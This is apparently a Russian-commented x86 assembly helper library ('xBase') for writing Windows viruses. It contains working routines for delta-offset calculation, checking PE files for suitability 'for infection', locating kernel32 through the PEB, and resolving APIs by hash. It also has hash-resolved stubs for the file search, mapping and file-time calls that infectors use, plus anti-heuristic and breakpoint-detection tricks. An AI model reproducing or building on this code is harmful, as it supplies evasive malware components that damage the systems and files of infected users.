;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											xBase														 ;
;																										 ;
;  GetDelta, ValidPE, xstrlen, small_symbol, CalcHash, xCRC32A, xCRC32, GetKernelBase, xGetProcAddress,  ;
;  											etc 														 ;
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 




 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;function GetDelta
;получение дельта-смещения 
;ВЫХОД:
;ЕАХ - дельта-смещение 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
GetDelta:
	call	_delta_
	mov		esp,ebp								;антиэвристика 
	pop		ebp
	ret
_delta_:
	pop		eax
	sub		eax,(_delta_ - 4)
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции GetDelta 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция ValidPE
;проверка файла на валидность
;ВХОД (stdcall) (ValidPE(LPVOID pExe)):
;	pExe - база мэпинга
;ВЫХОД:
;	EAX - 0, если хуйня, 1 если файл пригоден/валиден (для инфекта к примеру)
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
ValidPE:
	pushad
	xor		eax,eax  
	mov		esi,dword ptr [esp+24h]
	assume	esi:ptr IMAGE_DOS_HEADER
	cmp		[esi].e_magic,'ZM'
	jne		_xuita_
	cmp		[esi].e_lfanew,200h
	ja		_xuita_
	add		esi,[esi].e_lfanew
	assume	esi:ptr IMAGE_NT_HEADERS 
	cmp		[esi].Signature,'EP'
	jne		_xuita_ 
	cmp		[esi].FileHeader.Machine,IMAGE_FILE_MACHINE_I386
	jne		_xuita_
	cmp		[esi].FileHeader.NumberOfSections,0
	je		_xuita_
	cmp		[esi].FileHeader.NumberOfSections,65 
	ja		_xuita_
	movzx	ecx,[esi].FileHeader.Characteristics
	and		ecx,(IMAGE_FILE_EXECUTABLE_IMAGE + IMAGE_FILE_32BIT_MACHINE + IMAGE_FILE_DLL)
	cmp		ecx,(IMAGE_FILE_EXECUTABLE_IMAGE + IMAGE_FILE_32BIT_MACHINE) 
	jne		_xuita_
	cmp		[esi].OptionalHeader.Magic,IMAGE_NT_OPTIONAL_HDR32_MAGIC 
	jne		_xuita_ 
	cmp		[esi].OptionalHeader.Subsystem,IMAGE_SUBSYSTEM_WINDOWS_GUI
	jb		_xuita_
	cmp		[esi].OptionalHeader.Subsystem,IMAGE_SUBSYSTEM_WINDOWS_CUI
	ja		_xuita_  
	cmp		[esi].OptionalHeader.DataDirectory[4*8].VirtualAddress,0	;security directory 
	jne		_xuita_     
_vpret_: 
	inc		eax   
_xuita_: 
	mov		dword ptr [esp+1Ch],eax 
	popad
	ret		4 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи ValidPE 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция xstrlen
;поиск длины строки
;ВХОД ( xstrlen(char *pszStr) ):
;pszStr - указатель на строку, чью длину надо посчитать 
;ВЫХОД:
;EAX    - длина строки (в байтах) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xstrlen:
	push	edi		 
	mov		edi,dword ptr [esp+08]
	push	edi  
	xor		eax,eax
_numsymbol_: 
	scasb
	jne		_numsymbol_
	xchg	eax,edi
	dec		eax
	pop		edi
	sub		eax,edi
	pop		edi  
	ret		4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции xstrlen 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция small_symbol
;приведение бук0в строки к одному виду
;ВХОД ( small_symbol(char *pszStr) ):
;pszStr - указатель на строку (ака адрес строки)
;ВЫХОД:
;(+) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
small_symbol: 
	mov		eax,dword ptr [esp+04]   
_nxtsymbol_:	  
	cmp		byte ptr [eax],65
	jb		_skip01_ 
	cmp		byte ptr [eax],90
	ja		_skip01_  
	add		byte ptr [eax],32  
_skip01_: 
	cmp		byte ptr [eax],0
	je		_ssret_
	inc		eax 
	jmp		_nxtsymbol_  

_ssret_:
	mov		eax,dword ptr [esp+04] 
	ret		4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи small_symbol 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;function CalcHash
;подсчет хэша от строки
;ВХОД ( CalcHash(char*szFuncName) )
;szFuncName - адрес на строку
;ВЫХОД:
;EAX - хэш от строки 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
CalcHash:
	push	ecx				;[esp+04]
	push	esi				;[esp+00] 
	mov		esi,dword ptr [esp+12] 
	xor		eax,eax
	xor		ecx,ecx
_calc_: 
	ror		eax,7
	xor		ecx,eax
	lodsb
	test	al,al
	jne		_calc_ 
	xchg	eax,ecx
	pop		esi
	pop		ecx 
	ret		4 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции CalcHash 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	
		
		
		
		

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функция xCRC32A
;вычисление CRC строки
;ВХОД (stdcall) (xCRC32A(char *pszStr)):
;	pszStr - строка, чей хэш надо посчитать 
;ВЫХОД:
;	(+) EAX - хэш от строки 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xCRC32A:
	push	ecx
	mov		ecx,dword ptr [esp+08]   
	push	ecx
	call	xstrlen
	test	eax,eax
	je		_xcrc32aret_
	push	eax
	push	ecx 
	call	xCRC32
_xcrc32aret_: 
	pop		ecx 
	ret		4 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции xCRC32A 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 			




	 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функция xCRC32
;подсчет CRC32 
;ВХОД (stdcall) (xCRC32(BYTE *pBuffer,DWORD dwSize)):
;	pBuffer - буфер, в котором код, чей crc32 надо посчитать
;	dwSize  - сколько байт посчитать ? (+) 
;ВЫХОД:
;	(+) EAX - CRC32 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xCRC32:
	pushad
	mov		ebp,esp
	xor		eax,eax
	mov		edx,dword ptr [ebp+24h]
	mov		ecx,dword ptr [ebp+28h]
	jecxz	@4 
	dec		eax 
@1:
	xor		al,byte ptr [edx]
	inc		edx
	push	08
	pop		ebx
@2:
	shr		eax,1
	jnc		@3
	xor		eax,0EDB88320h
@3:
	dec		ebx 
	jnz		@2
	loop	@1
	not		eax
@4:
	mov		dword ptr [ebp+1Ch],eax 
	popad
	ret		4*2 							
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx		
;конец функции xCRC32 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	
		  




;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа GetKernelBase
;получение базы кернела через PEB
;ВЫХОД:
;	EAX - база кернела32   
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
GetKernelBase:
	pushad            
	mov 	edx,dword ptr fs:[30h]											;get a pointer to the PEB
	mov 	edx,dword ptr [edx+0Ch]											;get PEB->Ldr
	mov 	edx,dword ptr [edx+14h]											;get the first module from the InMemoryOrder module list
next_mod:
	mov 	esi,dword ptr [edx+28h]											;get pointer to modules name (unicode string)
  	push	24																;push down the length we want to check
  	pop 	ecx																;set ecx to this length for the loop
  	xor 	edi,edi															;clear edi which will store the hash of the module name
loop_modname:
  	xor 	eax,eax           
  	lodsb                  
  	cmp 	al,'a'															;some versions of Windows use lower case module names
  	jl 		not_lowercase
  	sub 	al,20h															;if so normalise to uppercase
not_lowercase:
  	ror 	edi,13															;rotate right our hash value
  	add 	edi,eax															;add the next byte of the name to the hash
  	loop 	loop_modname													;loop until we have read enough
  	cmp 	edi,6A4ABC5Bh													;compare the hash with that of KERNEL32.DLL
  	mov 	ebx,dword ptr [edx+10h]											;get this modules base address
  	mov 	edx,dword ptr [edx]												;get the next module
  	jne 	next_mod														;if it doesn't match, process the next module
  	mov		dword ptr [esp+1Ch],ebx 
  	popad
  	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции GetKernelBase 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx   	 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа xGetProcAddress 
;получение адреса нужной апишки 
;ВХОД (stdcall) (xGetProcAddress(DWORD base,DWORD hash)):
;	base - база модуля, где искать нужную апишку (например kernel32.dll/user32.dll/etc)
;	hash - хэш от имени нужной апишки (будет сравнение хэшей)
;ВЫХОД:
;	EAX - 0 или адрес нужной апишки
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx	
xGetProcAddress:
	pushad
	mov		ebp,esp
	mov		ebx,dword ptr [ebp+24h]				;base
	mov		esi,ebx 
	assume	esi:ptr IMAGE_DOS_HEADER
	add		esi,[esi].e_lfanew
	assume	esi:ptr IMAGE_NT_HEADERS
	mov		esi,[esi].OptionalHeader.DataDirectory[0*8].VirtualAddress
	add		esi,ebx 
	assume	esi:ptr IMAGE_EXPORT_DIRECTORY
	mov		ecx,[esi].NumberOfNames
	push	[esi].AddressOfFunctions 
	push	[esi].AddressOfNameOrdinals
	mov		esi,[esi].AddressOfNames
	add		esi,ebx
	xor		edx,edx 
_cyclexgpa_:
 	push	esi
 	mov		esi,dword ptr [esi]
 	add		esi,ebx 
 	push	esi
 	call	CalcHash
 	cmp		eax,dword ptr [ebp+28h]				;EAX == hash ?
 	pop		esi
 	je		_eq_h_
 	lodsd
 	inc		edx
 	loop	_cyclexgpa_       
_eq_h_:
	pop		esi
	pop		edi
	jecxz	_xgparet_							;если ничего не нашли, кладем 0 
	add		esi,ebx
	add		edi,ebx
	movzx	edx,word ptr [esi+edx*2]
	mov		ecx,dword ptr [edi+edx*4]
	add		ecx,ebx
_xgparet_:
	mov		dword ptr [ebp+1ch],ecx				;иначе адрес нужной апишки :)!  
	popad
	ret		4*2
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи xGetProcAddress 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx	 





;========================================================================================================
;вспомогательные функи 
;======================================================================================================== 
xGetApi:
	pop		ecx 
	call	GetKernelBase
	push	eax
	call	xGetProcAddress
	xchg	eax,ecx
	push	ecx 
	call	detect_bpx_api
	shl		eax,11h
	add		ecx,eax 
	jmp		ecx   	
;========================================================================================================
xCreateFileA1:
	push	0860B38BCh 
	call	xGetApi  
;--------------------------------------------------------------------------------------------------------
xCreateFileMappingA1:
	push	01F394C74h 
	call	xGetApi  
;--------------------------------------------------------------------------------------------------------
xMapViewOfFile1:
	push	0FC6FB9EAh
	call	xGetApi
;--------------------------------------------------------------------------------------------------------
xUnmapViewOfFile1:
	push	0CA036058h   
	call	xGetApi
;--------------------------------------------------------------------------------------------------------
xCloseHandle1:
	push	0F867A91Eh  
	call	xGetApi
;--------------------------------------------------------------------------------------------------------
xFindFirstFileA1:
	push	03165E506h 
	call	xGetApi  
;--------------------------------------------------------------------------------------------------------
xFindNextFileA1:
	push	0CA920AD8h 
	call	xGetApi
;--------------------------------------------------------------------------------------------------------
xFindClose1:
	push	0E65B28ACh  
	call	xGetApi
;--------------------------------------------------------------------------------------------------------
xGetCurrentDirectoryA1:
	push	02F597DD6h 
	call	xGetApi  
;--------------------------------------------------------------------------------------------------------
xSetFileAttributesA1:
	push	0152DC5D4h 
	call	xGetApi  
;--------------------------------------------------------------------------------------------------------
xSetFileTime1:
	push	0A2D2CB0Ch 
	call	xGetApi
;--------------------------------------------------------------------------------------------------------
xSetFilePointer1:
	push	07F3545C6h 
	call	xGetApi  
;--------------------------------------------------------------------------------------------------------
xSetEndOfFile1:
	push	0059C5E24h 
	call	xGetApi  
;--------------------------------------------------------------------------------------------------------
xVirtualAlloc1:
	push	019BC06C0h 
	call	xGetApi
;--------------------------------------------------------------------------------------------------------
xVirtualFree1:
	push	0EA43A878h 
	call	xGetApi  
;-------------------------------------------------------------------------------------------------------- 
xVirtualProtect1:
	push	015F8EF80h 
	call	xGetApi
;--------------------------------------------------------------------------------------------------------
xLoadLibraryA1:
	push	071E40722h 
	call	xGetApi  
;--------------------------------------------------------------------------------------------------------
xMultiByteToWideChar1:
	push	0BEB6624Ch 
	call	xGetApi  
;-------------------------------------------------------------------------------------------------------- 
xCreateThread1:
	push	015B87EA2h     
	call	xGetApi
;--------------------------------------------------------------------------------------------------------
xWaitForMultipleObjects1:
	push	0DD40E20h
	call	xGetApi
;--------------------------------------------------------------------------------------------------------
xConvertThreadToFiber1:
	push	031A87ED0h
	call	xGetApi  
;--------------------------------------------------------------------------------------------------------
xCreateFiber1:
	push	0FC3348BCh
	call	xGetApi 
;-------------------------------------------------------------------------------------------------------- 
xSwitchToFiber1:
	push	0A6862268h
	call	xGetApi 
;--------------------------------------------------------------------------------------------------------
xDeleteFiber1:
	push	0C647A16Eh
	call	xGetApi 
;-------------------------------------------------------------------------------------------------------- 


;XD ! 